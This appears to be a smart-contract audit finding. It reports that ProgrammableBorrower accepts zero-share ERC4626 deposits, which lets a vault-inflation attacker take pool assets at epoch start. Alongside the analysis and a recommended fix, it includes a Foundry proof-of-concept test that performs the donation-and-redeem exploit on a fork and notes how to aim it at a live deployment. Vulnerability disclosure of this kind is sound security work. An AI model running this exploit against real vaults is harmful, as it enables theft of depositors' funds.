### Title

Unchecked ERC4626 zero-share deposit can strand pool assets - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower._depositToVault` accepts a zero-share ERC4626 deposit as successful. An attacker who controls substantially all vault shares can inflate the vault’s price per share by donating underlying, causing the borrower’s next epoch-start deposit to mint zero shares. The deposited pool assets remain claimable by the attacker through their existing vault shares.

### Finding Description

During `onStartEpoch`, the borrower snapshots its combined idle-token and vault position, deposits every idle underlying token into the configured ERC4626 vault, and starts epoch accounting [1](#0-0) .

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))`, stores the returned share amount only in the event, and does not verify `shares != 0` or enforce a minimum acceptable output [2](#0-1) .

The ERC4626 interface explicitly warns that discrepancies between previews and execution are slippage and that a depositor can lose assets by depositing [3](#0-2) . A zero-share return is therefore a meaningful unsuccessful-result condition that must be checked, analogous to the missing NULL check in the referenced bug class.

### Impact Explanation

An attacker can create or acquire substantially all shares in the configured vault, then donate enough underlying so that one share is worth more than the idle amount waiting to be deposited by `ProgrammableBorrower`.

When the honest owner or manager starts the epoch:

1. `onStartEpoch` calls `_depositToVault` for the borrower’s entire idle balance [4](#0-3) .
2. `vault.deposit` transfers the underlying but mints zero shares because share conversion rounds down.
3. `_depositToVault` emits the zero-share event and returns normally [5](#0-4) .
4. The attacker redeems their vault shares and recovers both the donation and the deposited pool assets.
5. `epochStartVaultAssets` retains the pre-deposit principal baseline, while the live vault position is missing the deposited amount; the next accounting call reports the shortfall as vault loss [6](#0-5) .

The loss is equal to the deposited idle balance, less the attacker’s transaction costs and any economically unavoidable share premium. This is direct theft followed by LP NAV insolvency, not merely a transaction-failure DoS.

### Likelihood Explanation

Likelihood is deployment- and market-dependent.

- Any unprivileged vault user can perform the donation; no privileged Idle role is required.
- The attacker must control enough of the vault’s share supply to recover the donated principal after the zero-share deposit.
- Existing vault holders reduce the attacker’s recoverable fraction, while a vault where the attacker can obtain dominant or sole ownership makes the attack practical.
- The operation must occur before `onStartEpoch`, while `ProgrammableBorrower` holds idle underlying. Honest owner/manager epoch-start calls provide the trigger.

The current code has no `previewDeposit`, minimum-share parameter, nonzero-share check, or post-call `balanceOf` delta validation to stop the transaction.

### Recommendation

Require a nonzero and economically acceptable share output before accepting an ERC4626 deposit.

For example:

```solidity
uint256 sharesBefore = vault.balanceOf(address(this));
uint256 expectedShares = vault.previewDeposit(_assetAmount);
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares == 0 || shares < expectedShares * MIN_DEPOSIT_BPS / BPS) {
    revert InvalidAmount();
}
if (vault.balanceOf(address(this)) - sharesBefore != shares) {
    revert InvalidAmount();
}
```

Prefer exposing a `minSharesOut`/`maxSlippageBps` parameter on administrative paths or use `mint` with an exact share amount where the vault economics permit. The same protection should be applied to every `_depositToVault` call site, including epoch start and active-epoch repayments.

### Proof of Concept

The following Foundry test reproduces the missing check on a fork by calling `onStartEpoch` as the configured `idleCDO`. It requires a fork state in which the attacker can control substantially all shares of the configured ERC4626 vault; such states can be produced with an `vm prank`/share-acquisition setup appropriate to the selected deployment.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IERC4626Fork is IERC20 {
    function asset() external view returns (address);
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

interface IProgrammableBorrowerFork {
    function idleCDO() external view returns (address);
    function vault() external view returns (address);
    function onStartEpoch(uint256 pendingWithdraws) external;
}

contract ProgrammableBorrowerZeroShareForkTest is Test {
    IERC20 internal asset;
    IERC4626Fork internal vault;
    IProgrammableBorrowerFork internal borrower;

    function testZeroShareEpochStartDeposit() external {
        borrower = IProgrammableBorrowerFork(vm.envAddress("PROGRAMMABLE_BORROWER"));
        vault = IERC4626Fork(borrower.vault());
        asset = IERC20(vault.asset());

        address attacker = makeAddr("attacker");
        uint256 borrowerIdle = 100_000e6;
        uint256 attackerSeed = 1;
        uint256 donation = borrowerIdle + 1;

        deal(address(asset), address(borrower), borrowerIdle);
        deal(address(asset), attacker, attackerSeed + donation);

        // Attacker owns the controlling share position and inflates its value.
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        uint256 attackerShares = vault.deposit(attackerSeed, attacker);
        assertGt(attackerShares, 0);
        asset.transfer(address(vault), donation);
        vm.stopPrank();

        // For the inflated price, the borrower's deposit rounds to zero shares.
        uint256 sharesBefore = vault.balanceOf(address(borrower));
        uint256 attackerAssetsBefore = asset.balanceOf(attacker);

        vm.prank(borrower.idleCDO());
        borrower.onStartEpoch(0);

        assertEq(vault.balanceOf(address(borrower)), sharesBefore);
        assertEq(asset.balanceOf(address(borrower)), 0);

        vm.prank(attacker);
        uint256 recovered = vault.redeem(
            attackerShares,
            attacker,
            attacker
        );

        assertGt(asset.balanceOf(attacker), attackerAssetsBefore);
        assertGe(recovered, donation + borrowerIdle);
    }
}
```

For a concrete production deployment, set `PROGRAMMABLE_BORROWER` to the deployed borrower and use its configured `vault()`. If the live vault already has unaffiliated holders, the setup must first make the attacker the overwhelmingly dominant shareholder; the production defect remains that the zero-share return is accepted rather than rejected.

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L206-223)
```text
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-347)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L374-385)
```text
  /// @notice Move a specific amount of idle underlying into the vault.
  /// @param _assetAmount Amount of underlying to deposit
  /// @param _principalAssets Portion of the deposited assets that should extend the epoch principal
  /// baseline instead of being recognized as current-epoch profit.
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
```

**File:** contracts/interfaces/IERC4626.sol (L84-99)
```text
    /**
     * @dev Allows an on-chain or off-chain user to simulate the effects of their deposit at the current block, given
     * current on-chain conditions.
     *
     * - MUST return as close to and no more than the exact amount of Vault shares that would be minted in a deposit
     *   call in the same transaction. I.e. deposit should return the same or more shares as previewDeposit if called
     *   in the same transaction.
     * - MUST NOT account for deposit limits like those returned from maxDeposit and should always act as though the
     *   deposit would be accepted, regardless if the user has enough tokens approved, etc.
     * - MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.
     * - MUST NOT revert.
     *
     * NOTE: any unfavorable discrepancy between convertToShares and previewDeposit SHOULD be considered slippage in
     * share price or some other type of condition, meaning the depositor will lose assets by depositing.
     */
    function previewDeposit(uint256 assets) external view returns (uint256 shares);
```
